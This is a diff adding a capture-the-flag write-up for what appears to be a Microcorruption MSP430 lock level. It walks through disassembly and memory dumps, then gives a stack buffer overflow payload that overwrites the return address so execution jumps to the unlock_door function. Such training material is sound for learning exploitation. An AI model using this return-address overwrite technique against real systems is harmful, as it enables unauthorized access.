@@ -1,0 +1,57 @@
+Like in previous levels, this lock solution utilizes a buffer overflow,
+although this time we will be using it in a different fashion
+
+ex.
+
+4500 <login>
+4500:  3150 f0ff      add	#0xfff0, sp
+4504:  3f40 7c44      mov	#0x447c "Enter the password to continue.", r15
+4508:  b012 a645      call	#0x45a6 <puts>
+450c:  3f40 9c44      mov	#0x449c "Remember: passwords are between 8 and 16 characters.", r15
+4510:  b012 a645      call	#0x45a6 <puts>
+4514:  3e40 3000      mov	#0x30, r14
+4518:  0f41           mov	sp, r15
+451a:  b012 9645      call	#0x4596 <getsn>
+451e:  0f41           mov	sp, r15
+4520:  b012 5244      call	#0x4452 <test_password_valid>     <<<<<
+4524:  0f93           tst	r15
+4526:  0524           jz	$+0xc <login+0x32>
+4528:  b012 4644      call	#0x4446 <unlock_door>
+452c:  3f40 d144      mov	#0x44d1 "Access granted.", r15
+4530:  023c           jmp	$+0x6 <login+0x36>
+4532:  3f40 e144      mov	#0x44e1 "That password is not correct.", r15
+4536:  b012 a645      call	#0x45a6 <puts>
+453a:  3150 1000      add	#0x10, sp           <<<<<
+453e:  3041           ret
+
+to start with this level, we verify that buffer overflows are viable
+by checking the memory dump after entering a test password : aaaaaaaaaaaaaaaaff
+after that well simply follow the execution to see if anything strange appears
+
+                                         sp
+43e0: 5645 0000 a045 0200 ee43 3000 1e45 6161   VE...E...C0..Eaa
+43f0: 6161 6161 6161 6161 6161 6161 6161 6666   aaaaaaaaaaaaaaff
+  v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v
+43e0: 5645 0000 a045 0200 ee43 3000 1e45 6161   VE...E...C0..Eaa
+43f0: 6161 6161 6161 6161 6161 6161 6161 6666   aaaaaaaaaaaaaaff
+                                         sp
+output : insn address unaligned
+
+now that is interesting, the sp resides at the start of our password for a bit
+until the instruction at 453a adds #0x10 to it, which would ordinarily be just
+outside of our password (and presumably hold the return address of the failure function)
+we can tell because of that output, as the pc just tried to execute ff / 6666 which is
+not a real code address, so what if we tried to redirect to other parts of the firmware?
+
+4446 <unlock_door>
+4446:  3012 7f00      push	#0x7f
+444a:  b012 4245      call	#0x4542 <INT>
+444e:  2153           incd	sp
+4450:  3041           ret
+
+the unlock door function take no arguments, making it perfect for redirection
+and thus the solution becomes obvious - put 4644 at the end of our password so the sp
+returns to the unlock door function and opens the lock.
+
+hex encoded password : 4141 4141 4141 4141 4141 4141 4141 4141 4644
+
